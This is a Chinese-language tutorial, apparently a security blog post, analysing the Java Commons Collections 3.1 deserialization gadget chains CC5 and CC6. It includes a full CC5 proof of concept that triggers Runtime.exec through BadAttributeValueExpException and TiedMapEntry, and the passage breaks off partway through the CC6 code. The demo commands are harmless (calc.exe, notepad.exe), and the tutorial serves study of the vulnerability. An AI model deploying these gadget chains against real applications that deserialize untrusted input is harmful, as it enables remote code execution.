## CC5
### 前言
CC5是对CC3.1版本的利用，分析过CC1就很容易看懂CC5了。
可参考：  
[通俗易懂的Java Commons Collections 1分析](https://xz.aliyun.com/t/10357 "通俗易懂的Java
Commons Collections 1分析")
**环境搭建**
  * JDK 1.8
  * Commons Collections 3.1
pom.xml中添加：
            commons-collections
            commons-collections
            3.1
**利用链**
    ObjectInputStream.readObject()
                BadAttributeValueExpException.readObject()
                    TiedMapEntry.toString()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
ysoserial中提示到这只适用于JDK 8u76，并且没有安全管理器；  
### 前置知识
CC5中涉及到两个新的类，这里先介绍一下：
**TiedMapEntry**  
该类有两个参数，一个Map类型，一个Object类型；  
后面我们会使用到它的`getValue`和`toString`方法。
**BadAttributeValueExpException**  
该类只有一个`val`参数。
### POC分析
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class CC5 {
        public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
            BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
            Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
            val.setAccessible(true);
            val.set(poc,tiedmap);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5.bin"));
                outputStream.writeObject(poc);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5.bin"));
                inputStream.readObject();
            }catch(Exception e) {
                e.printStackTrace();
            }
        }
    }
**代码1**
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
这一部分和CC1中LazyMap链一样，只要调用了`LazyMap.get()`，就可以触发`ChainedTransformer.transform()`，进而对transformers数组进行回调，然后执行命令。
**代码2**
    TiedMapEntry tiedmap = new TiedMapEntry(outerMap, 123);
            BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
            Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
            val.setAccessible(true);
            val.set(poc,tiedmap);
`TiedMapEntry.getValue()`调用了`get()`，参数`map`是可控的；  
所以实例化TiedMapEntry类，将`outerMap`传进去，第二个参数可以随便填，用来占位；
接着，`toString()`方法又调用了`getValue()`方法；  
继续找哪里调用了`toString()`方法；  
`BadAttributeValueExpException.readObject()`调用了`toString()`方法；  
`valObj`是从`gf`中的`val`参数获取的，而`gf`又是从反序列化流中读取的；  
所以，相当于控制了`val`参数，就控制了`valObj`，这里就通过反射给`val`赋为`TiedMapEntry`类的实例化对象；  
即调用了`TiedMapEntry.toString()`，这样就满足了命令执行需要的所以条件。
### POC调试
从`BadAttributeValueExpException,readObject()`跟起，`valObj`就获取到`TiedMapEntry`类的对象；  
跟进`toString`；  
跟进`getValue`；  
跟进`get`，这里出现了一点问题，`map`中包含了一个`key`为`123`，所以if判断为假，并没有进如if；  
按道理是该进入if的，我又尝试了几次；  
只在这个if这里断点，前面的断点都取消掉，那么`map`就没有`key`，可以进入if；  
不知道这是什么原因，猜测是跟IDEA的调试机制有关吧；
继续，就跟到了`ChainedTransformer.transform()`，这里就对`tranaforms`数组进行循环回调；  
循环到第三次`InvokerTransformer.transform()`；  
return后，成功执行命令；  
## CC6
### 前言
CC6还是通过调用`LazyMap#get`来触发RCE，任然用到了`TiedMapEntry`类，只不过调用`TiedMapEntry#getValue`的链不一样。
**环境搭建**
  * JDK 1.8
  * Commons Collections 3.1
pom.xml中添加：
            commons-collections
            commons-collections
            3.1
**利用链**
    java.io.ObjectInputStream.readObject()
             java.util.HashMap.readObject()
                     java.util.HashMap.put()
                     java.util.HashMap.hash()
                            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                                 org.apache.commons.collections.map.LazyMap.get()
                                      org.apache.commons.collections.functors.ChainedTransformer.transform()
                                      org.apache.commons.collections.functors.InvokerTransformer.transform()
                                       java.lang.reflect.Method.invoke()
                                              java.lang.Runtime.exec()
### 利用链分析
找到调用`LazyMap#get`的地方，任然是`TiedMapEntry#getValue`，`map`可控，传入LazyMap即可；  
接下来寻找调用`getValue()`的地方，找到`TiedMapEntry#hashCode`；  
接着寻找调用`hashCode()`的地方，找到`HashMap#hash`；  
继续寻找调用`hash()`的地方，找到`HashMap#put`；  
最后，在`HashSet#readObject`中，调用了`put()`；  
### POC分析
**代码1**
    Transformer[] fakeTransformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"notepad.exe"}),
                };
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
    };
构造两个Transformer数组，因为在后面调用`add()`的时候也会触发RCE，用两个不同的命令加以区分；
**代码2**
    Transformer transformerChain = new ChainedTransformer(fakeTransformers);
    Map innerMap = new HashMap();
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
new一个`ChainedTransformer`对象，先将`fakeTransformers`传进去；  
同样new一个`LazyMap`对象；
**代码3**
    TiedMapEntry tiedmap = new TiedMapEntry(outerMap,"foo");
    HashSet hashset = new HashSet();
    hashset.add(tiedmap);
    outerMap.remove("foo");
这里调用`add()`方法将含有恶意代码的对象传入`hashSet`，就不用像ysoserial中使用反射去传值，这样比较简便；  
跟一下`add()`方法，这里的`map`是TiedMapEntry对象，跟进`put`；  
调用了`hash`方法，继续跟进，`k`也是TiedMapEntry对象；  
跟进`hashcode()`，这里就调用到了`getValue`；  
跟进，`map`是LazyMap，调用了`get`方法；  
来到`get()`，进入if，调用了`transform`；  
跟进，这里的`iTransformers`是我们传入的`fakeTransformers`，里面是`notepad.exe`命令；  
命令执行；  
可以看一下这时的调用栈；  
当然在这里执行命令不算咯，得在反序列化时执行才有用，这里也可以不使用`InvokerTransformer`，只是为了更清楚的表达这里也会调用`LazyMap#get`，触发RCE；
继续分析，这里已经调用过一次`LazyMap#get`了，为了后面反序列化时，能进入`get()`的if判断，所以调用`remove()`将key值删除掉；  
**代码4**
    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");